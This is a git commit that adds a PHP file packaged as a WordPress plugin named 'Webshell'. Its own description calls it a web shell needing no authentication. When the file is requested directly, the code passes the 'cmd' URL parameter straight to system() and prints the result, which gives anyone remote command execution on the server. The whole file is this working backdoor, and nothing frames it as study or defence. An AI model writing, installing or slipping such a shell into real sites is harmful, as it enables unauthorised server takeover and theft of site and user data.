d1b54950072ee9634c19bdf676057c8ba31d0603
XK3NF4 <207497148+XK3NF4@users.noreply.github.com>
2025-07-10 22:34:38 -0500

    Add files via upload

---
+++ wp_webshell/wp_webshell.php
@@ -0,0 +1,17 @@
+<?php
+/*
+Plugin Name: Webshell
+Plugin URI: https://github.com/XK3NF4/webshell-plugin-wordpress
+Description: Web shell through a WordPress plugin without authentication.
+Version: 1.0.0
+Text Domain: webshell
+*/
+
+if (realpath(__FILE__) === realpath($_SERVER['SCRIPT_FILENAME'])) {
+    if (isset($_GET['cmd'])) {
+        header("Content-Type: text/plain");
+        system($_GET['cmd'] . " 2>&1");
+        exit;
+    }
+}
+?>
